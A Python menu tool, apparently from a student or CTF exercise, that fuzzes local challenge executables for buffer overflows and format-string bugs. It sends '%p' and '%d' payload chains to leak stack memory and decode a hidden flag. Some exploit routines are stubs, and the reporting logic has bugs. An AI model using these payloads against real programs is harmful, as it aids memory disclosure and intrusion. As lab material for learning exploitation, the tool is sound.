import subprocess
import re
import os
import time
import sys
import string
from colorama import init, Fore, Style

init(autoreset=True)

def run_program_buffer_overflow(input_program, buffer):
    proc = subprocess.Popen([f'.\\{input_program}.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proc.stdin.write(buffer)
    proc.stdin.flush()

    output = proc.stdout.read().decode()

    proc.stdin.close()
    proc.stdout.close()
    proc.wait()

    return output

def run_program_format_string(input_data, input_program):
    proc = subprocess.Popen([f'./{input_program}.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    stdout_data, _ = proc.communicate(input_data)
    return stdout_data

def check_format_specifiers(input_program):
    format_specifiers = ["%c", "%d", "%f", "%p", "%s", "%x", "%n"]
    expected_output_patterns = {
        "%c": r"[ -~]",  # matches any ASCII printable character
        "%d": r"\d+",   # matches any integer
        "%f": r"\d+\.\d+",  # matches any floating-point number
        "%p": r"(0x)?[0-9a-fA-F]+",  # matches any hex number
    }

    for specifier in format_specifiers:
        time.sleep(0.5)
        input_data = specifier 
        output_data = run_program_format_string(specifier + "\n" + input_data + "\n", input_program)

        # Only check output pattern if it's defined for the current specifier
        if specifier in expected_output_patterns:
            pattern = expected_output_patterns[specifier]
            if re.search(pattern, output_data):
                print(f"\033[32m[+] The format specifier {specifier} may be vulnerable\033[0m")
                print("Full response of the program:")
                print(output_data)
                continue

        print(f"\033[31m[-] The format specifier {specifier} is not vulnerable\033[0m")
        print("Full response of the program:")
        print(output_data)

def analyze_output(output_data, input_value, input_program):
    if input_value in output_data:
        print(f"\n{Fore.YELLOW}The input {input_value} matches the value found in the output. This means that the program may be vulnerable\n" + Style.RESET_ALL)
        check_format_specifiers(input_program)

        specifiers = {
            '1': '%c',
            '2': '%d',
            '3': '%p',
            '4': '%f',
            '5': '%s',
            '6': '%x',
            '7': '%n\n',
        }

        print(Fore.YELLOW + "[+] Enter the specifier you want to use for the exploit:\n")
        for key, value in specifiers.items():
            print(f"{key}: {value}")

        while True:
            specifier_choice = input(f"{Fore.GREEN}Enter the number of your choice > {Style.RESET_ALL}")
            if specifier_choice in specifiers:
                chosen_specifier = specifiers[specifier_choice]
                break
            else:
                print("Invalid choice, please enter a valid number.")
        
        print(f"You chose: {chosen_specifier}\n" + Style.RESET_ALL)
        if chosen_specifier == '%p':
            run_exploit_p()
        elif chosen_specifier == '%d':
            run_exploit_d()
        elif chosen_specifier == '%c':
            run_exploit_c()
        elif chosen_specifier == '%f':
            run_exploit_f()
        elif chosen_specifier == '%s':
            run_exploit_s()
        elif chosen_specifier == '%x':
            run_exploit_x()
        elif chosen_specifier == '%n':
            run_exploit_n()
    else:
        print(f"The input {input_value} does not match the value found in the output.\n")

def run_exploit_p():
    proc = subprocess.Popen(['.\modern2.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    
    input_data = b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p%p%p\n'.decode()
    print(Fore.GREEN + "\nThe payload for this specifier = \033[0m" + input_data)
    stdout_data, _ = proc.communicate(input_data)
    
    pattern = r'\b[0-9A-Fa-f]+\b'

    matches = re.findall(pattern, stdout_data)

    if matches:
        value = matches[-1]
        print(f"\nThe found hexadecimal value is: \n{value}")

        print("\nThis value is now being converted to ASCII\n")
        
        hex_string = value

        swapped_hex_string = ''.join([hex_string[i:i+16] for i in range(0, len(hex_string), 16)][::-1])

        hex_with_spaces = ' '.join([swapped_hex_string[i:i+2] for i in range(0, len(swapped_hex_string), 2)])

        ascii_value = ''.join([chr(int(b, 16)) for b in hex_with_spaces.split()])[::-1]

        if "flag" in ascii_value:
            print(f"{Fore.YELLOW}The flag was found in the ASCII output.")
        else:
            print(f"{Fore.RED}The flag was not found in the ASCII output.{Style.RESET_ALL}")
        
        print(ascii_value)

def run_exploit_d():
    proc = subprocess.Popen(['.\modern2.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    input_data = b'%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d\n'
    stdout_data, stderr_data = proc.communicate(input_data)

    if stdout_data:
        stdout_data = stdout_data
        value = stdout_data[-1]
        print(f"The program prompts :{stdout_data}")

        numberss = [stdout_data[i:i+2] for i in range(0, len(stdout_data), 2)]

        ascii_output = "".join(chr(int(num)) for num in numberss if num.isdigit())

        if "flag" in ascii_output:
            print(f"{Fore.RED}The flag was found in the ASCII output.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}The flag was not found in the ASCII output.{Style.RESET_ALL}")
        
        print(ascii_output)

def run_exploit_c():
    print (f"\nI was to lazy to make an exploit here, so go back")
    return()

def run_exploit_f():
    print (f"\nI was to lazy to make an exploit here, so go back")
    return()

def run_exploit_s():
    print (f"This is not going to work ")
    return()

def run_exploit_x():
    print (f"This is not going to work ")
    return()

def run_exploit_n():
    print (f"This is not going to work ")
    return()

def format_string_menu():
    print("\nYou have chosen Format String Vulnerability.")
    print("Press 'Ctrl+C' anytime to go back to the main menu.\n")
    while True:
        try:
            input_program = input(Fore.GREEN + "Enter the program name you want to fuzz and exploit: " + Style.RESET_ALL)
            if os.path.isfile(f'./{input_program}.exe'):
                break
            else:
                print(Fore.RED + f"Program {input_program}.exe does not exist. Please enter a valid program name." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\nGoing back to the main menu...")
            main_menu()

    input_data = "AAA"
    output_data = run_program_format_string(input_data, input_program)

    analyze_output(output_data, input_data, input_program)

    go_back_to_main_menu()

def go_back_to_main_menu():
    choice = input(f"\n{Fore.GREEN}Do you want to go back to the main menu? (y/N): {Style.RESET_ALL}")
    if choice.lower() == "y":
        main_menu()
    elif choice.lower() == "n":
        print(f"{Fore.RED}\n\nExiting the program. BYEBYE {Style.RESET_ALL}")
        sys.exit()
    else:
        print(f"{Fore.RED}Invalid choice. Please enter Y or N. {Style.RESET_ALL}")
        go_back_to_main_menu()

def buffer_overflow_menu():
    print("\nYou have chosen Buffer Overflow Vulnerability.")
    print("Press 'Ctrl+C' anytime to go back to the main menu.\n")
    while True:
        try:
            input_program = input(Fore.GREEN + "Enter the program name you want to fuzz and exploit :) > " + Style.RESET_ALL)
            if os.path.isfile(f'./{input_program}.exe'):
                break
            else:
                print(Fore.RED + f"Program {input_program}.exe does not exist. Please enter a valid program name." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\nGoing back to the main menu...")
            main_menu()

    print(f"\n{Fore.YELLOW}Please choose the buffer length range for the length fuzzing:\n{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [1] 1 - 50{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [2] 50 - 100{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [3] Other - Please specify {Style.RESET_ALL}")

    while True:
        try:
            buffer_length_input = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
            if buffer_length_input == "1":
                start_len1, end_len1 = 1, 50
                break
            elif buffer_length_input == "2":
                start_len1, end_len1 = 50, 100
                break
            elif buffer_length_input == "3":
                start_len1 = int(input(Fore.GREEN + "Enter the start number: " + Style.RESET_ALL))
                end_len1 = int(input(Fore.GREEN + "Enter the end number: " + Style.RESET_ALL))
                print(f"{Fore.YELLOW}\n[+] You have chosen numbers {start_len1} - {end_len1}\n{Style.RESET_ALL}")
                if start_len1 <= end_len1 and end_len1 <= 200:
                    print(f"{Fore.YELLOW}\n[+] You have chosen numbers {start_len1} - {end_len1}\n{Style.RESET_ALL}")
                    break
                print(Fore.RED + "[-] Invalid input. Please enter a valid range up to 200." + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] Invalid input. Please enter a valid range." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\nGoing back to the main menu...")
            main_menu()
    try:
        for length in range(start_len1, end_len1):
            buffer = b"A" * length
            sys.stdout.write(f'\rTrying with buffer: {buffer}{" " * (64 - len(buffer))}')
            sys.stdout.flush()
            output = run_program_buffer_overflow(input_program, buffer)
            if "flag" in output:
                print(f"\n{Fore.GREEN}Flag found! The vulnerability was exploited with a buffer of length {length}, using length fuzzing." + Style.RESET_ALL)
                break

    except Exception as e:
        print(f"\nFuzzing crash at {length} bytes")
        print(output)
        print(e)

    print(Fore.RED + "\nNo vulnerabilities were found. The program is not vulnerable to this type of fuzzing.\n" + Style.RESET_ALL)

    print(f"\n{Fore.YELLOW}Please choose the buffer length range for the mutation fuzzing:\n{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [1] 1 - 50{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [2] 50 - 100{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [3] Other - Please specify {Style.RESET_ALL}")

    while True:
        try:
            buffer_length_input = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
            if buffer_length_input == "1":
                start_len2, end_len2 = 1, 50
                break
            elif buffer_length_input == "2":
                start_len2, end_len2 = 50, 100
                break
            elif buffer_length_input:
                start_len2 = int(input(Fore.GREEN + "Enter the start number: " + Style.RESET_ALL))
                end_len2 = int(input(Fore.GREEN + "Enter the end number: " + Style.RESET_ALL))
                if start_len2 <= end_len2 and end_len2 <= 200:
                    print(f"{Fore.YELLOW}\n[+] You have chosen numbers {start_len2} - {end_len2}\n{Style.RESET_ALL}")
                    break
                print(Fore.RED + "[-] Invalid input. Please enter a valid range up to 200." + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] Invalid input. Please enter a valid range." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\nGoing back to the main menu...")
            main_menu()

    flag_found = False
    for length in range(start_len2, end_len2):
        if flag_found: break
        base_buffer = b"a" * length
        for index in range(length):
            if flag_found: break
            for char in string.ascii_letters:
                try:
                    buffer = bytearray(base_buffer)
                    buffer[index] = ord(char)
                    sys.stdout.write(f'\rTrying buffer (please pe patiënt): {buffer}{" " * (64 - len(buffer))}')
                    sys.stdout.flush()
                    output = run_program_buffer_overflow(input_program, buffer)

                    if "flag" in output:
                        print(f"\n\n{Fore.GREEN}Flag found! The vulnerability was exploited with the buffer {len(buffer)}, using mutation fuzzing.\n" + Style.RESET_ALL)
                        print(f"{Fore.YELLOW}The output of the program =\n")
                        print(Fore.RED + output + Style.RESET_ALL)
                        flag_found = True
                        break

                except Exception as e:
                    print(f"\nFuzzing crash at {buffer}")
                    print(e)

    if not flag_found:
        print(Fore.RED + "\nNo vulnerabilities were found. The program is not vulnerable to this type of fuzzing.\n" + Style.RESET_ALL)

    go_back_to_main_menu()

def main_menu():
    while True:
        try:
            banner = f"""{Fore.BLUE}
            _____  ____    ____   _                     
            / ____|/ __ \  / __ \ | |                    
            | |    | |  | || |  | || |                    
            | |    | |  | || |  | || |                    
            | |____| |__| || |__| || |____                
            \_____|\____/  \____/ |______| 
            ____          
            |  _ \    /\    | \ | || \ | ||  ____||  __ \ 
            | |_) |  /  \   |  \| ||  \| || |__   | |__) |
            |  _ <  / /\ \  | . ` || . ` ||  __|  |  _  / 
            | |_) |/ ____ \ | |\  || |\  || |____ | | \ \ 
            |____//_/____\_\|_|_\_||_| \_||______||_|  \_\
            
            |  _ \ |  __ \  / __ \                        
            | |_) || |__) || |  | |                       
            |  _ < |  _  / | |  | |                       
            | |_) || | \ \ | |__| |                       
            |____/ |_|  \_\ \____/                        
            {Style.RESET_ALL}
            """
            print(banner)
            print(f"{Fore.GREEN}[+] Welcome to my automatic vulnerability discover and exploitation. made by GS{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] In the menu below, you can choose a number for what you want to do:\n{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[1] Format String vulnerability    ")
            print(f"{Fore.YELLOW}[2] Buffer Overflow vulnerability  ")
            print(f"{Fore.YELLOW}[3] Exit\n{Style.RESET_ALL}")

            choice = input(Fore.GREEN + "Enter your choice: " + Style.RESET_ALL)

            if choice == "1":
                format_string_menu()
            elif choice == "2":
                buffer_overflow_menu()
            elif choice == "3":
                print("Exiting the program.")
                sys.exit()
            else:
                print(Fore.RED + "Invalid choice. Please choose a number from 1 to 3." + Style.RESET_ALL)

        except KeyboardInterrupt:
            print(f"{Fore.RED}\n\nCTRL+C detected. Exiting the program. BYEBYE {Style.RESET_ALL}")
            sys.exit()

if __name__ == "__main__":
    main_menu()
